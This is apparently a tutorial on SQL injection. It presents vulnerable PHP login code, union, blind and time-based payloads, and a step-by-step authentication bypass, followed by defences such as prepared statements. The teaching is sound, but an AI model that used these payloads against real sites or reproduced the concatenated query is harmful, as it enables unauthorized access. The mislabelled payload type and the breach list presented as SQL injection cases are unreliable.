## Introduction

SQL injection is one of the most critical web application security risks. It occurs when an attacker is able to insert malicious SQL statements into an application's database query.

## What is SQL Injection?

SQL injection (SQLi) is a code injection technique that exploits a security vulnerability in an application's software. The vulnerability happens when user input is incorrectly filtered for string literal escape characters or when user input is not strongly typed.

### Common Vulnerable Code

Here's an example of vulnerable PHP code:

```php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);
```

## Types of SQL Injection

### 1. In-band SQLi (Classic SQLi)

The most common type where the attacker uses the same communication channel to launch the attack and gather results.

#### Error-based SQLi

```sql
' OR 1=1 --
```

This classic payload:
- The single quote `'` closes the string
- `OR 1=1` makes the condition always true
- `--` comments out the rest of the query

#### Union-based SQLi

```sql
' UNION SELECT null, username, password FROM users--
```

### 2. Blind SQLi

The attacker asks the database true/false questions and determines the answer based on the application's response.

```sql
' AND 1=1 --  (true - page loads normally)
' AND 1=2 --  (false - page behaves differently)
```

### 3. Time-based Blind SQLi

```sql
' OR SLEEP(5) --
```

If the page takes 5 seconds to load, it's vulnerable!

## Hands-on Practice

Let's try a real example. Consider a login form with this URL:

```
https://example.com/login.php?username=admin&password=secret
```

### Step 1: Test for Vulnerability

Try these inputs:
1. Username: `admin'`
2. Username: `admin' OR '1'='1`
3. Username: `admin' --`

### Step 2: Bypass Authentication

```sql
Username: admin' OR '1'='1' --
Password: (anything)
```

This works because the resulting query becomes:

```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'
```

The `--` comments out the password check, and `'1'='1'` is always true!

- **Burp Suite**: Web vulnerability scanner
- **Manual Testing**: Using browser developer tools

## Defense Mechanisms

### 1. Prepared Statements (Parameterized Queries)

```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

### 2. Input Validation

```javascript
function validateInput(input) {
  const pattern = /^[a-zA-Z0-9_-]{3,20}$/;
  return pattern.test(input);
}
```

### 3. Escaping User Input

```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
```

### 4. Least Privilege

Database users should only have the permissions they need.

## Real-world Impact

- **Equifax (2017)**: 147 million records exposed
- **Yahoo (2013)**: 3 billion accounts compromised
- **Target (2013)**: 40 million credit cards stolen

## Summary

SQL injection remains a critical threat because:
- It's easy to exploit
- The impact can be devastating
- Many applications still have vulnerabilities
- Automated tools make it accessible to attackers

**Remember**: Always use prepared statements and never trust user input!
